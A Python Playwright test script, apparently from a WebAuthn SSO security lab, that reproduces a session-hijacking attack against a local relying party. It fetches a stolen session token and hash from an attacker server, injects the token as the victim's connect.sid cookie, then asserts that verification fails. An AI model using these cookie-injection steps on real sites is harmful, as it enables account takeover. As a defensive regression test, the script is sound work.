import os
import time
import asyncio
import httpx
from bs4 import BeautifulSoup
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeoutError

RP_URL = os.environ.get('RP_URL') or 'http://localhost:4444'
ATTACKER_URL = os.environ.get('ATTACKER_URL') or "http://localhost:6666"

# attacker credentials
attacker_username = 'fuga'
attacker_password = 'fuga'

async def sso_flow(page):
    await page.goto(f"{RP_URL}/login")

    await page.locator('input[name="userId"]').fill(f'{attacker_username}')
    await page.locator('input[name="password"]').fill(f'{attacker_password}')
    try:
        # Click login button
        await page.locator('button[type="submit"]').click(timeout=1000)

        # Click continue button
        await page.locator('input[value="Yes"]').click(timeout=1000)
    except PlaywrightTimeoutError:
        print("Timeout!")

    return page

async def main():
    async with async_playwright() as p:
        browser = await p.chromium.launch()
        context = await browser.new_context(ignore_https_errors=True)
        page = await context.new_page()

        # Install virtual authenticator
        cdpSession = await context.new_cdp_session(page)
        await cdpSession.send('WebAuthn.enable')
        await cdpSession.send('WebAuthn.addVirtualAuthenticator', {
            'options': {
                'protocol': 'ctap2',
                'transport': 'internal',
                'automaticPresenceSimulation': True,
                'hasResidentKey': True,
                'hasUserVerification': True,
                'isUserVerified': True,
            }
        })

        # Get session_token, secret from attacker server
        async with httpx.AsyncClient() as client:
            res = await client.get(f"{ATTACKER_URL}/data/session_token")
            creds = res.json()
            session_token = creds['session_token']
            hash = creds['hash']

        print("session_token: ", session_token)
        print("hash: ", hash)
        assert(session_token != None)
        assert(hash != None)

        # Sign up(attacker, attacker's browser)
        page = await sso_flow(page)
        await page.click('#registerButton')
        time.sleep(3) # wait 3 seconds

        content = await page.content()
        soup = BeautifulSoup(content, 'html.parser')
        result = soup.find('p', id='content')
        print("sign up result (attacker): ", result)
        assert("Sign up succeeded." in result)

        # Sign in(attacker, attacker's browser)
        page = await sso_flow(page)
        await page.click('#loginButton')
        time.sleep(3) # wait 3 seconds

        content = await page.content()
        soup = BeautifulSoup(content, 'html.parser')
        result = soup.find('p', id='content')
        print("sign in result (attacker): ", result)
        assert("Sign in succeeded." in result)

        # Set session_token, secret to attacker's browser
        await context.add_cookies([{
            'name': 'connect.sid', 
            'value': session_token,
            'domain': 'rp',
            'path': '/',
        }])
        cookies = await context.cookies()
        print("cookies: ", cookies)

        # After sigin in(attacker, attacker's browser)
        res = await page.evaluate('''async (hash) => {
            const response = await fetch("/after/signin", {
                method: "POST",
                credentials: "same-origin",
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ hash: hash })
            });
            return response.json(); // assuming the response is JSON
        }''', hash)
        print("after sign in result (attacker): ", res)
        assert(res['verified'] == False)

        await browser.close()
        
if __name__ == "__main__":
    asyncio.run(main())